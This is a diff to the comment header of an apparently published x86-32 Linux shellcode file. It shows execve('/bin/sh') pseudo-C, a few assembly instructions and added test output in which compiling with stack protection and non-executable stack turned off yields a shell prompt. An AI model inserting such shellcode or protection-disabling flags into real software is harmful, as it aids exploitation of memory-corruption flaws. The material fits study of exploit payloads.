@@ -4,7 +4,6 @@
 @Author: byhankswang@gmail.com
 @Tested on: x86-32/i686 ubuntu-14.04 Kernel-3.19.0-25-generic 
 
-
 @what we want to do:
 #include <stdio.h>
 
@@ -17,7 +16,6 @@
 
         execve( sc[0], 0, 0);
     }
-
 
 @assembly to realize the above code
 
@@ -33,9 +31,32 @@
      8048067:       b0 0b                   mov    $0xb,%al
      8048069:       cd 80                   int    $0x80
 
-@compile the shellcode
-gcc -fno-stack-protector -z execstack -o bin_sh  bin_sh.c
+@testing results
+    byhankswang@vubuntu32:~$ uname -a
+    Linux vubuntu32 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
+    byhankswang@vubuntu32:~$
+    byhankswang@vubuntu32:~$ cat /etc/os-release
+    NAME="Ubuntu"
+    VERSION="14.04.3 LTS, Trusty Tahr"
+    ID=ubuntu
+    ID_LIKE=debian
+    PRETTY_NAME="Ubuntu 14.04.3 LTS"
+    VERSION_ID="14.04"
+    HOME_URL="http://www.ubuntu.com/"
+    SUPPORT_URL="http://help.ubuntu.com/"
+    BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+    byhankswang@vubuntu32:~$
+    byhankswang@vubuntu32:~$ gcc -fno-stack-protector -z execstack -o bin_sh bin_sh.c
+    byhankswang@vubuntu32:~$
+    byhankswang@vubuntu32:~$ ./bin_sh
+    $
+    $ env
+    PWD=/home/byhankswang
+    $ exit
+    byhankswang@vubuntu32:~$
+
 */
+
 
 
 #include <stdio.h>
